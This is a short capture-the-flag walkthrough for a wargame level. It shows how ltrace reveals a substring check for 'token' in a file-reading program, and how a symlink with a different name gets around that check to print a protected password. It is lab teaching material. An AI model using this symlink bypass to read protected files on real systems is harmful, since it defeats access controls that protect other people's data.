# Level 08

**Exploit:** Symlink-based filename-check bypass

The program rejects paths containing `token`, but follows a symlink whose name does not contain that word.

## Walkthrough

The program can read a file when given its path. Test it with a file you own:

```bash
echo 'bonjour les amis' > /tmp/test2
./level08 /tmp/test2
```

Output:

```text
bonjour les amis
```

The program prints the file contents. Trace its filename check with `ltrace`:

```bash
ltrace ./level08 /tmp/test
```

Output:

```text
strstr("/tmp/test", "token")                                    = NULL
open("/tmp/test", 0, 014435162522)                              = 3
```

```bash
ltrace ./level08 token
```

Output:

```text
strstr("token", "token")                                        = "token"
```

The trace shows a substring check for `token`. Create a symlink with a different name that points to the protected file, then pass the link to the program:

```bash
ln -s /home/user/level08/token /tmp/link
./level08 /tmp/link
```

The program follows the symlink and prints the password for `flag08`.
